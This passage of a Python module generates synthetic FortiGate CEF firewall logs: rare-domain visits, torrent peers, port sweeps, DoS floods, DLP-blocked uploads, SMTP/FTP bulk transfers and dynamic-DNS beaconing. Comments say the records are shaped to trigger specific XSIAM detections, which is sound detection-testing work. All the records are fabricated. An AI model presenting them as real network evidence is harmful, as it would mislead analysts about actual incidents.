    })
    return _format_fortinet_cef(config, "1059028992", "utm", "app-ctrl", "warning", fields)


def _simulate_rare_domain_communication(config, src_ip, user, shost):
    """ALLOWED web session from a workstation to a domain nobody in the org has ever
    resolved — XSIAM "Abnormal Communication to a Rare Domain".

    Tightened: prefers a recurring host when available so the (host, domain) pair
    has a chance to reappear; DNS + webfilter passthrough + traffic are emitted
    in a tight window; destination is always a rare-pool IP.
    """
    domain = rare_domain()
    dst_ip = rare_external_ip()
    dpt    = random.choices([443, 8443, 4443, 8080, 4444], weights=[75, 8, 7, 6, 4])[0]
    logs   = [_dns_precursor(config, src_ip, user, shost, domain, dst_ip)]

    wf = _base_traffic_fields(config, src_ip, shost, user, dst_ip, domain, "6", dpt, "passthrough",
                              duration_s=random.randint(2, 20))
    wf.update({
        "app": "HTTPS", "act": "passthrough", "FTNTFGTutmaction": "passthrough",
        "FTNTFGTeventtype": "ftgd_allow",
        "FTNTFGTlogdesc": "URL belongs to an allowed category in policy",
        "FTNTFGTcatdesc": "Newly Observed Domain",
        "request": f"https://{domain}/", "FTNTFGThttpmethod": "GET", "FTNTFGThttpcode": "200",
        "requestClientApplication": random.choice(_BROWSER_UA),
        "outcome": "success", "msg": f"URL visited: https://{domain}/",
    })
    logs.append(_format_fortinet_cef(config, "0316013057", "utm", "webfilter", "notice", wf))

    tr = _base_traffic_fields(config, src_ip, shost, user, dst_ip, domain, "6", dpt, "accept",
                              duration_s=random.randint(2, 20))
    tr.update({"app": "HTTPS", "request": f"https://{domain}/",
               "out": random.randint(800, 6_000), "in": random.randint(2_000, 60_000),
               "msg": f"HTTPS session to {domain}"})
    logs.append(_format_fortinet_cef(config, "0000000013", "traffic", "forward", "notice", tr))
    return logs


def _simulate_recurring_rare_domain(config, src_ip, user, shost, domain=None, dst_ip=None):
    """Recurring allowed session to the same rare domain from a stable host.
    Honors the 1-day dedup window so the detector is not exhausted.
    """
    try:
        from modules.session_utils import rare_dedup_ok
    except ImportError:
        from session_utils import rare_dedup_ok
    if not rare_dedup_ok(src_ip):
        return []
    key = f"rare_dom::{src_ip}"
    if domain is None or dst_ip is None:
        try:
            from modules.session_utils import rare_pair_for_host
        except ImportError:
            from session_utils import rare_pair_for_host
        domain, dst_ip = rare_pair_for_host(src_ip)
    dpt = 443
    logs = [_dns_precursor(config, src_ip, user, shost, domain, dst_ip)]

    tr = _base_traffic_fields(config, src_ip, shost, user, dst_ip, domain, "6", dpt, "accept",
                              duration_s=random.randint(5, 60))
    tr.update({"app": "HTTPS", "request": f"https://{domain}/",
               "out": random.randint(500, 4_000), "in": random.randint(1_000, 30_000),
               "msg": f"Recurring HTTPS to rare domain {domain}"})
    logs.append(_format_fortinet_cef(config, "0000000013", "traffic", "forward", "notice", tr))
    return logs


def _simulate_rare_appid_session(config, src_ip, user, shost):
    """Allowed session with an uncommon application to a rare external destination —
    targets 'Rare AppID usage to a rare destination'.
    """
    apps = ["SSH", "RDP", "Telnet", "FTP", "SMTP"]
    app = random.choice(apps)
    dst_ip = rare_external_ip()
    dpt = {"SSH": 22, "RDP": 3389, "Telnet": 23, "FTP": 21, "SMTP": 25}[app]
    f = _base_traffic_fields(config, src_ip, shost, user, dst_ip, None, "6", dpt, "accept",
                             duration_s=random.randint(10, 300))
    f.update({
        "app": app,
        "out": random.randint(1_000, 50_000),
        "in": random.randint(2_000, 200_000),
        "msg": f"Rare {app} session to rare external {dst_ip}",
    })
    return [_format_fortinet_cef(config, "0000000013", "traffic", "forward", "notice", f)]


# Peer ports a BitTorrent client actually uses: the classic 6881-6889 range, the
# uTorrent/Transmission default 51413, and DHT on the same ports over UDP.
_BT_PORTS = [6881, 6882, 6883, 6884, 6885, 6886, 6887, 6888, 6889, 51413]


def _simulate_torrent_client(config, src_ip, user, shost):
    """A workstation running a BitTorrent client — XSIAM "A Torrent client was
    detected on a host".

    Tightened: majority of peers drawn from the rare external pool; time window
    kept to ~10 minutes so the burst is denser.
    """
    now  = time.time()
    logs = []
    for _ in range(random.randint(15, 35)):
        udp  = random.random() < 0.4
        peer = rare_external_ip() if random.random() < 0.7 else _random_external_ip()
        dpt  = random.choice(_BT_PORTS)
        f = _base_traffic_fields(config, src_ip, shost, user, peer, None,
                                 "17" if udp else "6", dpt, "accept",
                                 duration_s=random.randint(5, 600))
        f.update({
            "app": "BitTorrent", "FTNTFGTapp": "BitTorrent", "FTNTFGTappid": 15001,
            "FTNTFGTappcat": "P2P", "FTNTFGTapprisk": "high",
            "FTNTFGTservice": "udp/" + str(dpt) if udp else "tcp/" + str(dpt),
            "out": random.randint(20_000, 4_000_000), "in": random.randint(50_000, 12_000_000),
            "FTNTFGTeventtime": int((now - random.randint(0, 600)) * 1_000_000_000),
            "msg": f"BitTorrent peer session to {peer}:{dpt}",
        })
        logs.append(_format_fortinet_cef(config, "0000000013", "traffic", "forward", "notice", f))
    return logs


# ── Analytic detectors added 2026-09-18 (Tier 1-3 coverage; see docs/firewall-analytics.md) ──

def _fg_conn(config, src, dst, dpt, app, act, user=None, shost=None,
             in_role="lan", out_role="wan", proto="6", out_b=None, in_b=None,
             duration_s=None, event_time=None, appcat="Network.Service", apprisk="elevated",
             dst_country="United States", logdesc="Forward traffic"):
    """Compact FortiGate traffic:forward event builder for the added detectors.

    `app` lands in the `app` field, which FortiGate's XIF maps to
    xdm.network.application_protocol (measured 2026-09-17). in_role/out_role set the
    interface roles: lan->wan outbound, wan->lan inbound (New FTP Server), lan->lan
    east-west (Port Sweep, DC SMB).
    """
    forti_conf = _get_config(config)
    iface = {"lan": forti_conf.get("interface_lan", "port10"),
             "wan": forti_conf.get("interface_wan", "port1")}
    f = {
        "src": src, "spt": random.randint(49152, 65535), "shost": shost, "suser": user,
        "dst": dst, "dpt": dpt, "proto": proto, "app": app, "act": act,
        "deviceInboundInterface": iface[in_role], "deviceOutboundInterface": iface[out_role],
        "FTNTFGTpolicyid": forti_conf.get("default_policy_id", "1"),
        "FTNTFGTpolicyname": logdesc.replace(" ", "_"),
        "FTNTFGTapp": app, "FTNTFGTappcat": appcat, "FTNTFGTapprisk": apprisk,
        "FTNTFGTsrccountry": "Reserved" if in_role == "lan" else dst_country,
        "FTNTFGTdstcountry": dst_country if out_role == "wan" else "Reserved",
        "FTNTFGTduration": (duration_s if duration_s is not None else random.randint(1, 60)),
        "out": out_b if out_b is not None else random.randint(200, 5000),
        "in": in_b if in_b is not None else random.randint(2000, 50000),
        "FTNTFGTsentpkt": random.randint(2, 40), "FTNTFGTrcvdpkt": random.randint(5, 80),
        "FTNTFGTosname": random.choice(_SRC_OS_WINDOWS), "FTNTFGTsrcmac": _random_mac(shost),
        "FTNTFGTservice": _port_to_service(dpt) or app,
        "FTNTFGTlogdesc": logdesc,
        "FTNTFGTsrcintfrole": in_role, "FTNTFGTdstintfrole": out_role,
        "externalId": _session_id(),
        "outcome": "success" if act in ("accept", "allow", "passthrough") else "failed",
        "msg": f"{act} {app} {src} -> {dst}:{dpt}",
    }
    if event_time is not None:
        f["FTNTFGTeventtime"] = int(event_time * 1_000_000_000)
    return _format_fortinet_cef(config, "0000000013", "traffic", "forward",
                                "notice" if act == "accept" else "warning", f)


# Privileged ports only. The Cortex "Port Sweep" analytic counts connections to many
# hosts "using privileged ports that serve a well-defined function"; privileged means
# below 1024. This pool used to include 1433 (MSSQL) and 3389 (RDP), so a quarter of
# sweeps -- in all four firewall modules, which shared the list -- could never satisfy
# the detector. RDP and MSSQL sweeps are real attacker behaviour, but they belong to
# the RDP/SQL analytics, not to Port Sweep.
_FG_SWEEP_PORTS = [21, 22, 23, 88, 135, 139, 389, 445, 636]


def _simulate_port_sweep(config, src_ip, user, shost):
    """One internal host probing the SAME privileged port across MANY internal hosts in
    several subnets — XSIAM "Port Sweep" (mirror of Port Scan; needs only
    source/destination/port). Returns list."""

    port = random.choice(_FG_SWEEP_PORTS)
    try:
        from modules.session_utils import sweep_targets
    except ImportError:
        from session_utils import sweep_targets
    # Known live hosts over several /24s (session_utils.sweep_targets): random
    # addresses in the /16s are hosts the analytics engine has never seen.
    targets = set(sweep_targets(config, exclude={src_ip}))
    responders = set(random.sample(sorted(targets), max(1, int(len(targets) * random.uniform(0.10, 0.30)))))
    now = time.time(); window = random.randint(120, 600)
    logs = []
    for dst in targets:
        ok = dst in responders
        logs.append(_fg_conn(config, src_ip, dst, port, _port_to_service(port) or "tcp/" + str(port),
                             "accept" if ok else "deny", user=user, shost=shost,
                             in_role="lan", out_role="lan",
                             out_b=(random.randint(200, 4000) if ok else 40),
                             in_b=(random.randint(400, 20000) if ok else 0),
                             duration_s=(random.randint(2, 45) if ok else 0),
                             event_time=now - random.randint(0, window),
                             logdesc="Forward traffic" if ok else "Forward traffic denied"))
    return logs


def _simulate_dc_smb_outbound(config, src_ip, user, shost):
    """SMB from a DOMAIN CONTROLLER to a workstation — XSIAM "Suspicious SMB connection
    from domain controller". Normal direction is workstation->DC. The source must be a
    host XSIAM already sees as a DC, so it comes from _get_domain_controllers(). Returns
    list."""
    dcs = _get_domain_controllers(config)
    if not dcs:
        return None
    dc_ip = random.choice(dcs)

    nets = config.get("internal_networks", ["192.168.1.0/24"])
    try:
        target = rand_ip_from_network(ip_network(random.choice(nets), strict=False))
    except Exception:
        target = "192.168.1.101"
    logs = []
    for _ in range(random.randint(2, 4)):
        logs.append(_fg_conn(config, dc_ip, target, 445, "SMB", "accept", user="SYSTEM",
                             in_role="lan", out_role="lan", appcat="Network.Service",
                             out_b=random.randint(5_000, 50_000), in_b=random.randint(5_000, 200_000),
                             duration_s=random.randint(5, 60), logdesc="Forward traffic"))
    return logs


def _simulate_new_ftp_server(config, src_ip, user, shost):
    """An internal host begins SERVING inbound FTP — XSIAM "New FTP Server" (and its
    "from an external source" variation). 3-6 distinct external clients connect INBOUND
    to an internal host on TCP/21. This is the correct shape; ftp_large_exfil (outbound
    upload) was reclassified 2026-09-18. Returns list."""

    servers = config.get("internal_servers", [])
    try:
        from modules.session_utils import new_ftp_server_host
    except ImportError:
        from session_utils import new_ftp_server_host
    ftp_ip = new_ftp_server_host(config)   # never a hot internal_servers host: see helper
    now = time.time()
    logs = []
    for _ in range(random.randint(3, 6)):
        client = _random_external_ip()
        logs.append(_fg_conn(config, client, ftp_ip, 21, "FTP", "accept", user=None,
                             in_role="wan", out_role="lan",
                             out_b=random.randint(2_000, 20_000),
                             in_b=random.randint(50_000, 5_000_000),
                             duration_s=random.randint(10, 300),
                             event_time=now - random.randint(0, 600),
                             dst_country="Reserved", logdesc="Forward traffic"))
    return logs


_FG_RARE_APPID_PORTS = [443, 8443, 993, 465]


def _simulate_rare_appid(config, src_ip, user, shost):
    """A recognisable application on a port it does not belong on, to a RARE destination
    — XSIAM "Rare AppID usage to a rare destination". FortiGate DPI identifies the app
    regardless of port; the mismatch + rare dest is the signal. Returns list."""

    app = random.choice(["SSH", "RDP", "SMTP", "IRC"])
    dpt = random.choice(_FG_RARE_APPID_PORTS)
    dst = rare_external_ip()
    now = time.time()
    logs = []
    for _ in range(random.randint(1, 3)):
        logs.append(_fg_conn(config, src_ip, dst, dpt, app, "accept", user=user, shost=shost,
                             appcat="unscanned", apprisk="high",
                             out_b=random.randint(20_000, 2_000_000),
                             in_b=random.randint(20_000, 2_000_000),
                             duration_s=random.randint(60, 1800),
                             event_time=now - random.randint(0, 600),
                             logdesc="Forward traffic"))
    return logs


def _simulate_abnormal_rdp_rare_host(config, src_ip, user, shost):
    """A single RDP session from a seldom-seen internal host to a seldom-targeted one —
    XSIAM "Abnormal RDP session to a remote host from a rarely seen host". Source from a
    stable rare-source pool (an ordinary workstation carries too much traffic to be
    "rarely seen"); destination from rare_internal_host(). Returns list of 1-2."""
    # The rare host speaks for itself: no borrowed employee identity, and a hostname of
    # its own (see session_utils.stable_rare_sources for why both matter).
    try:
        from modules.session_utils import rare_source_host
    except ImportError:
        from session_utils import rare_source_host
    src, src_host = rare_source_host(config, "fortinet_fortigate")
    dst = rare_internal_host(config, exclude=(src,))

    logs = [_fg_conn(config, src, dst, 3389, "RDP", "accept", user=None, shost=src_host,
                     in_role="lan", out_role="lan", appcat="Remote.Access", apprisk="high",
                     out_b=random.randint(50_000, 3_000_000), in_b=random.randint(200_000, 5_000_000),
                     duration_s=random.randint(120, 2400), logdesc="Forward traffic")]
    return logs


def _simulate_rare_smtp_session(config, src_ip, user, shost):
    """A workstation opening an SMTP/S session to a mail server it has never used — XSIAM
    "Rare SMTP/S Session". Distinct from smtp_spray (many servers): ONE rare server, a
    normal-looking single session. app=SMTP/SMTPS carries the AppID. Returns list."""

    smtps = random.random() < 0.5
    dpt, app = (465, "SMTPS") if smtps else (25, "SMTP")
    dst = rare_external_ip()
    logs = [_fg_conn(config, src_ip, dst, dpt, app, "accept", user=user, shost=shost,
                     appcat="Email", apprisk="medium",
                     out_b=random.randint(2_000, 200_000), in_b=random.randint(500, 5_000),
                     duration_s=random.randint(1, 30), logdesc="Forward traffic")]
    return logs


def _simulate_dos_anomaly(config, src_ip=None, user=None, shost=None):
    """DoS-sensor flood detection — utm:anomaly (Fortinet DoS policy).

    Genuine FortiGate: type=utm subtype=anomaly eventtype=anomaly. An external
    attacker floods an internal server; the DoS policy clears sessions once the
    rate crosses the configured threshold. Models icmp/syn/udp/session floods.
    """
    forti_conf = _get_config(config)
    ext_ip     = _random_external_ip()
    geo        = _ext_geo()
    dst_ip     = random.choice(config.get("internal_servers", ["172.16.200.55"]))

    # (attack name, proto, service/app, dst port, uses ICMP fields)
    anomalies = [
        ("icmp_flood",     "1",  "PING",  0,   True),
        ("tcp_syn_flood",  "6",  "HTTP",  80,  False),
        ("udp_flood",      "17", "DNS",   53,  False),
        ("ip_dst_session", "6",  "HTTPS", 443, False),
    ]
    attack, proto, service, dport, uses_icmp = random.choice(anomalies)
    attack_id = random.randint(16777000, 16778000)
    count     = random.randint(51, 5000)
    threshold = random.choice([50, 100, 250, 1000])

    fields = {
        "src":                     ext_ip,
        "dst":                     dst_ip,
        "dpt":                     dport or None,
        "proto":                   proto,
        "app":                     service,
        "act":                     "clear_session",
        "FTNTFGTeventtype":        "anomaly",
        "FTNTFGTseverity":         "critical",
        "FTNTFGTattack":           attack,
        "FTNTFGTattackid":         attack_id,
        "FTNTFGTpolicyid":         forti_conf.get("dos_policy_id", "1"),
        "FTNTFGTpolicytype":       "DoS-policy",
        "FTNTFGTref":              f"http://www.fortinet.com/ids/VID{attack_id}",
        "FTNTFGTlogdesc":          "Anomaly was detected",
        "cnt":                     count,
        "deviceInboundInterface":  forti_conf.get("interface_wan", "port1"),
        "deviceOutboundInterface": forti_conf.get("interface_lan", "port10"),
        "FTNTFGTsrcintfrole":      "wan",
        "FTNTFGTdstintfrole":      "lan",
        "FTNTFGTsrccountry":       geo["country"],
        "FTNTFGTsrccity":          geo["city"],
        "FTNTFGTsrcregion":        geo["region"],
        "FTNTFGTdstcountry":       "Reserved",
        "FTNTFGTduration":         0,
        "FTNTFGTcrscore":          str(random.randint(30, 50)),
        "FTNTFGTCRlevel":          "critical",
        "externalId":              _session_id(),
        "outcome":                 "failed",
        "msg":                     f"anomaly: {attack}, {count} > threshold {threshold}",
    }
    if uses_icmp:
        fields.update({
            "FTNTFGTicmpid":   f"0x{random.randint(0, 65535):04x}",
            "FTNTFGTicmptype": "0x08",
            "FTNTFGTicmpcode": "0x00",
        })
    return _format_fortinet_cef(config, "0720018433", "utm", "anomaly", "alert", fields)


def _simulate_dlp_block(config, src_ip, user, shost):
    """DNS precursor + outbound upload + DLP block — multi-log exfil chain (returns list).

    Models a data-exfiltration sequence sharing one session id: the host resolves a
    file-sharing domain, opens an outbound HTTPS upload session (traffic:forward,
    accepted at the network layer), then the FortiGate DLP sensor matches a
    sensitive-content rule and blocks the transfer (utm:dlp). Returns
    [dns, traffic:forward, utm:dlp] — conversation-complete for exfil scenarios.
    Genuine FortiGate: type=utm subtype=dlp eventtype=dlp.
    """
    forti_conf  = _get_config(config)
    geo         = _ext_geo()
    exfil_dests = config.get("exfiltration_destinations") or [{}]
    dest        = random.choice(exfil_dests)
    dst_ip      = rand_ip_from_network(ip_network(dest.get("ip_range", "154.53.224.0/24"), strict=False))
    dst_domain  = dest.get("domain") or random.choice(
        ["upload.box.com", "wetransfer.com", "mega.nz", "drive.google.com", "pastebin.com"])

    # (dlp rule/dlpextra, filtertype, filtercat, severity, filename, filetype)
    dlp_hits = forti_conf.get("dlp_rules") or [
        ("Credit-Card-Number", "regex",       "regex", "high",     "cardholder_export.csv", "csv"),
        ("US-SSN",             "regex",       "regex", "high",     "employee_ssn.xlsx",     "xlsx"),
        ("Source-Code",        "file-type",   "file",  "medium",   "app_source.zip",        "zip"),
        ("Confidential-Doc",   "watermark",   "file",  "high",     "Q3_financials.pdf",     "pdf"),
        ("PII-Fingerprint",    "fingerprint", "file",  "critical", "customer_records.xlsx", "xlsx"),
    ]
    rule, filtertype, filtercat, severity, fname, filetype = random.choice(dlp_hits)
    file_size  = random.randint(20_000, 20_000_000)
    sent_bytes = random.randint(file_size // 2, file_size)   # partial upload before block
    session_id = _session_id()

    # Log 1: DNS resolution of the exfil destination
    logs = [_dns_precursor(config, src_ip, user, shost, dst_domain, dst_ip)]

    # Log 2: outbound HTTPS upload session — accepted at the network layer (traffic:forward)
    fwd = _base_traffic_fields(
        config, src_ip, shost, user, dst_ip, dst_domain, "6", 443, "accept",
        dst_country=geo["country"], dst_city=geo["city"], dst_region=geo["region"]
    )
    fwd.update({
        "app":               "HTTPS",
        "out":               sent_bytes,
        "in":                random.randint(1000, 10000),
        "FTNTFGTapp":        "HTTPS.Upload",
        "FTNTFGTappid":      40569,
        "FTNTFGTappcat":     "Collaboration",
        "FTNTFGTapprisk":    "elevated",
        "FTNTFGTpolicyid":   forti_conf.get("file_share_policy_id", "10"),
        "FTNTFGTpolicyname": forti_conf.get("file_share_policy_name", "allow-file-sharing"),
        "FTNTFGTdstcountry": geo["country"],
        "FTNTFGTdstcity":    geo["city"],
        "requestClientApplication": random.choice(_BROWSER_UA),
        "externalId":        session_id,
        "msg":               f"Outbound upload {sent_bytes // 1024}KB to {dst_domain}",
    })
    logs.append(_format_fortinet_cef(config, "0000000013", "traffic", "forward", "notice", fwd))

    # Log 3: DLP sensor block on the same session (utm:dlp)
    dlp = _base_traffic_fields(
        config, src_ip, shost, user, dst_ip, dst_domain, "6", 443, "block",
        dst_country=geo["country"], dst_city=geo["city"], dst_region=geo["region"]
    )
    dlp.update({
        "app":                 "HTTPS",
        "act":                 "block",
        "FTNTFGTutmaction":    "blocked",
        "FTNTFGTeventtype":    "dlp",
        "FTNTFGTfilteridx":    str(random.randint(1, 6)),
        "FTNTFGTdlpextra":     rule,
        "FTNTFGTfiltertype":   filtertype,
        "FTNTFGTfiltercat":    filtercat,
        "FTNTFGTseverity":     severity,
        "FTNTFGTepoch":        str(random.randint(1, 999_999_999)),
        "FTNTFGTeventid":      "0",
        "FTNTFGTfiletype":     filetype,
        "fname":               fname,
        "fsize":               file_size,
        "FTNTFGTprofile":      forti_conf.get("dlp_profile", "default-dlp"),
        "FTNTFGTlogdesc":      "DLP sensor detected sensitive data",
        "dhost":               dst_domain,
        "request":             f"https://{dst_domain}/upload/{fname}",
        "FTNTFGThttpmethod":   "POST",
        "requestClientApplication": random.choice(_BROWSER_UA),
        "externalId":          session_id,
        "outcome":             "failed",
        "msg":                 f"DLP rule '{rule}' matched: {fname} blocked",
    })
    logs.append(_format_fortinet_cef(config, "0954024576", "utm", "dlp", "warning", dlp))
    return logs


def _simulate_rare_external_rdp(config, src_ip, user, shost):
    """DNS precursor + rare external RDP — returns list."""

    forti_conf = _get_config(config)
    dst_ip     = rare_external_ip()   # rare pool, not ambient
    geo        = _ext_geo()
    duration_s = random.randint(30, 1800)
    rdp_domain = f"rdp-{random.randint(10,99)}.{random.choice(['cloud-desktop.net', 'remote-access.biz', 'vdi-host.com'])}"

    logs = [_dns_precursor(config, src_ip, user, shost, rdp_domain, dst_ip)]

    fields = _base_traffic_fields(
        config, src_ip, shost, user, dst_ip, None, "6", 3389, "accept",
        duration_s=duration_s, dst_country=geo["country"],
        dst_city=geo["city"], dst_region=geo["region"]
    )
    fields.update({
        "out":              random.randint(5000, 500000),
        "in":               random.randint(10000, 1000000),
        "FTNTFGTsentpkt":   random.randint(10, 1000),
        "FTNTFGTrcvdpkt":   random.randint(20, 2000),
        "app":              "RDP",
        "FTNTFGTapp":       "RDP",
        "FTNTFGTappid":     16100,
        "FTNTFGTappcat":    "Remote.Access",
        "FTNTFGTapprisk":   "high",
        "msg":              f"Outbound RDP session {src_ip} -> {dst_ip}:3389",
    })
    logs.append(_format_fortinet_cef(config, "0000000013", "traffic", "forward", "warning", fields))
    return logs


def _simulate_smtp_spray(config, src_ip, user, shost):
    """Workstation connecting to 30-50 distinct external SMTP servers.

    Multi-event generator: each event is a traffic:forward accept to a
    different external IP on port 25 or 587. Pattern triggers XSIAM
    Spam Bot Traffic detection.

    Returns list of CEF log strings.
    """

    forti_conf = _get_config(config)
    n_targets  = random.randint(30, 50)
    logs       = []

    for _ in range(n_targets):
        dst_ip   = _random_external_ip()
        geo      = _ext_geo()
        smtp_port = random.choice([25, 587])
        fields = {
            "src":                     src_ip,
            "spt":                     random.randint(49152, 65535),
            "shost":                   shost,
            "suser":                   user,
            "dst":                     dst_ip,
            "dpt":                     smtp_port,
            "proto":                   "6",
            "app":                     "SMTP",
            "act":                     "accept",
            "deviceInboundInterface":  forti_conf.get("interface_lan", "port10"),
            "deviceOutboundInterface": forti_conf.get("interface_wan", "port1"),
            "FTNTFGTpolicyid":         forti_conf.get("default_policy_id", "1"),
            "FTNTFGTpolicyname":       forti_conf.get("default_policy_name", "allow-outbound"),
            "FTNTFGTgroup":            "Domain_Users",
            "FTNTFGTsrccountry":       "Reserved",
            "FTNTFGTdstcountry":       geo["country"],
            "FTNTFGTdstcity":          geo["city"],
            "FTNTFGTdstregion":        geo["region"],
            "FTNTFGTduration":         random.randint(1, 10),
            "out":                     random.randint(500, 5000),
            "in":                      random.randint(200, 2000),
            "FTNTFGTsentpkt":          random.randint(3, 15),
            "FTNTFGTrcvdpkt":          random.randint(2, 10),
            "FTNTFGTosname":           random.choice(_SRC_OS_WINDOWS),
            "FTNTFGTsrcmac":           _random_mac(shost),
            "FTNTFGTservice":          _port_to_service(smtp_port),
            "FTNTFGTlogdesc":          "Forward traffic",
            "FTNTFGTsrcintfrole":      "lan",
            "FTNTFGTdstintfrole":      "wan",
            "externalId":              _session_id(),
            "outcome":                 "success",
            "msg":                     f"SMTP connection to {dst_ip}:{smtp_port}",
        }
        logs.append(_format_fortinet_cef(config, "0000000013", "traffic", "forward", "notice", fields))
    return logs


def _simulate_smtp_large_exfil(config, src_ip, user, shost):
    """DNS precursor + large SMTP exfiltration — returns list."""

    dst_ip     = _random_external_ip()
    geo        = _ext_geo()
    sent_mb    = random.randint(100, 500)
    duration_s = random.randint(120, 900)
    mx_domain  = random.choice(["mail-relay.biz", "smtp-out.net", "mx-forward.com"])

    logs = [_dns_precursor(config, src_ip, user, shost, mx_domain, dst_ip)]

    fields = _base_traffic_fields(
        config, src_ip, shost, user, dst_ip, None, "6",
        random.choice([25, 587]), "accept",
        duration_s=duration_s, dst_country=geo["country"],
        dst_city=geo["city"], dst_region=geo["region"]
    )
    fields.update({
        "app":              "SMTP",
        "FTNTFGTapp":       "SMTP",
        "FTNTFGTappid":     15900,
        "FTNTFGTappcat":    "Email",
        "FTNTFGTapprisk":   "medium",
        "out":              sent_mb * 1024 * 1024,
        "in":               random.randint(1000, 10000),
        "msg":              f"Large SMTP transfer {sent_mb}MB to {dst_ip}",
    })
    logs.append(_format_fortinet_cef(config, "0000000013", "traffic", "forward", "warning", fields))
    return logs


def _simulate_ftp_large_exfil(config, src_ip, user, shost):
    """DNS precursor + large FTP exfiltration — returns list."""

    dst_ip     = _random_external_ip()
    geo        = _ext_geo()
    sent_mb    = random.randint(100, 500)
    duration_s = random.randint(120, 1200)
    ftp_domain = random.choice(["ftp-upload.biz", "file-drop.net", "storage-sync.com"])

    logs = [_dns_precursor(config, src_ip, user, shost, ftp_domain, dst_ip)]

    fields = _base_traffic_fields(
        config, src_ip, shost, user, dst_ip, None, "6", 21, "accept",
        duration_s=duration_s, dst_country=geo["country"],
        dst_city=geo["city"], dst_region=geo["region"]
    )
    fields.update({
        "app":              "FTP",
        "FTNTFGTapp":       "FTP",
        "FTNTFGTappid":     15896,
        "FTNTFGTappcat":    "File.Sharing",
        "FTNTFGTapprisk":   "medium",
        "out":              sent_mb * 1024 * 1024,
        "in":               random.randint(1000, 10000),
        "msg":              f"Large FTP upload {sent_mb}MB to {dst_ip}:21",
    })
    logs.append(_format_fortinet_cef(config, "0000000013", "traffic", "forward", "warning", fields))
    return logs


_ddns_beacon_map: dict = {}   # src_ip -> stable (ddns_hostname, resolved_ip) for DDNS recurrence


def _simulate_ddns_connection(config, src_ip, user, shost):
    """Recurring beacon to a dynamic-DNS domain: one DNS resolution followed by a
    burst of HTTPS callbacks to the SAME DDNS host.

    Uses FortiGuard URL category 88 ("Dynamic DNS") for the webfilter event
    and a traffic:forward accept for the subsequent connections.

    The DDNS hostname and its resolved IP are STICKY PER SOURCE HOST (same idiom as
    _dns_tunnel_target_map above). XSIAM's "Recurring rare domain access to dynamic
    DNS domain" needs one endpoint returning to ONE rare domain repeatedly. Choosing
    a fresh provider x subdomain per call (12 x 10 = 120 combinations) with a random
    source produced scattered single hits — the opposite of recurrence. A
    concentrated replay (1 host -> 1 domain, 45-90 sessions) is the correct shape.
    DO NOT restore per-call randomisation.

    Returns list of CEF log strings.
    """

    forti_conf = _get_config(config)
    ddns_providers = [
        "duckdns.org",     "no-ip.com",       "dynu.com",
        "afraid.org",      "hopto.org",        "zapto.org",
        "sytes.net",       "ddns.net",         "servebeer.com",
        "myftp.biz",       "myvnc.com",        "redirectme.net",
    ]
    subdomains = [
        "update-service", "cdn-relay", "mail-check", "vpn-gateway",
        "api-health", "sync-node", "cloud-backup", "office-proxy",
        "fw-mgmt", "dns-cache",
    ]
    if src_ip not in _ddns_beacon_map:
        _rnd = random.Random(hash(("ddns", src_ip)) & 0xFFFFFFFF)
        _ddns_beacon_map[src_ip] = (
            f"{_rnd.choice(subdomains)}.{_rnd.choice(ddns_providers)}",
            _random_external_ip(),
        )
    ddns_hostname, resolved_ip = _ddns_beacon_map[src_ip]
    geo           = _ext_geo()
    logs          = []

    # Log 1: DNS query for the DDNS hostname
    dns_fields = {
        "src":              src_ip,
        "spt":              random.randint(49152, 65535),
        "shost":            shost,
        "suser":            user,
        "dst":              forti_conf.get("dns_server", "8.8.8.8"),
        "dpt":              53,
        "proto":            "17",
        "act":              "passthrough",
        "app":              "DNS",
        "FTNTFGTeventtype": "dns-query",
        "FTNTFGTqname":     ddns_hostname,
        "FTNTFGTqtype":     "A",
        "FTNTFGTqclass":    "IN",
        "FTNTFGTipaddr":    resolved_ip,
        "FTNTFGTpolicyid":  forti_conf.get("default_policy_id", "1"),
        "FTNTFGTpolicyname": forti_conf.get("default_policy_name", "allow-outbound"),
        "FTNTFGTgroup":     "Domain_Users",
        "FTNTFGTsrccountry":"Reserved",
        "FTNTFGTdstcountry":"Reserved",
        "FTNTFGTduration":  0,
        "out":              random.randint(50, 100),
        "in":               random.randint(50, 200),
        "FTNTFGTsentpkt":   1,
        "FTNTFGTrcvdpkt":   1,
        "FTNTFGTosname":    random.choice(_SRC_OS_WINDOWS),
        "FTNTFGTsrcmac":    _random_mac(shost),
        "FTNTFGTservice":   "DNS",
        "FTNTFGTlogdesc":   "DNS response",
        "FTNTFGTsrcintfrole": "lan",
        "FTNTFGTdstintfrole": "wan",
        "externalId":       _session_id(),
        "cat":              "88",
        "FTNTFGTcatdesc":   "Dynamic DNS",
        "outcome":          "success",
        "msg":              f"DNS query for DDNS domain {ddns_hostname}",
    }
    logs.append(_format_fortinet_cef(config, "1501054802", "dns", "dns-query", "warning", dns_fields))

    # Logs 2..N: a BURST of HTTPS callbacks to the same resolved IP. One session is a
    # visit; the detector wants recurrence, so emit 8-16 per invocation.
    for _ in range(random.randint(8, 16)):
        conn_fields = _base_traffic_fields(
            config, src_ip, shost, user, resolved_ip, ddns_hostname, "6", 443, "accept",
            duration_s=random.randint(30, 600),
            dst_country=geo["country"], dst_city=geo["city"], dst_region=geo["region"]
        )
        conn_fields.update({
            "app":   "HTTPS",
            "cat":   "88",
            "FTNTFGTcatdesc": "Dynamic DNS",
            "msg":   f"HTTPS connection to DDNS host {ddns_hostname} ({resolved_ip})",
        })
        logs.append(_format_fortinet_cef(config, "0000000013", "traffic", "forward", "warning", conn_fields))
    return logs


# XSIAM-firewall-analytics-aligned threat generators

_dns_tunnel_target_map: dict = {}   # src_ip -> stable (resolver_ip, tunnel_domain) for DNS-tunnel recurrence

_ABNORMAL_VPN_OS = ["Linux", "Kali Linux 2024.2", "Ubuntu 22.04", "Android 13",
                    "macOS (unknown build)", "FreeBSD 14"]


def _get_domain_controllers(config):
    """DC IPs for LDAP/Kerberos traffic; falls back to synthesized DC addresses."""
    forti_conf = _get_config(config)
    dcs = forti_conf.get("domain_controllers") or config.get("domain_controllers")
    if dcs:
        return dcs
    return ["10.0.10.10", "10.0.20.10", "10.1.5.10", "192.168.1.10", "172.16.10.10"]


def _b32_chunk(n):
    """High-entropy base32-ish label of length n (DNS-tunnel encoded data)."""
    return "".join(random.choice("abcdefghijklmnopqrstuvwxyz234567") for _ in range(n))


def _simulate_large_download(config, src_ip, user, shost):
    """DNS precursor + large INBOUND transfer — 'Large Download' volume anomaly.
    Complements Large Upload (this flips the byte direction: huge in / small out)."""

    dests   = config.get("exfiltration_destinations") or [{}]
    dest    = random.choice(dests)
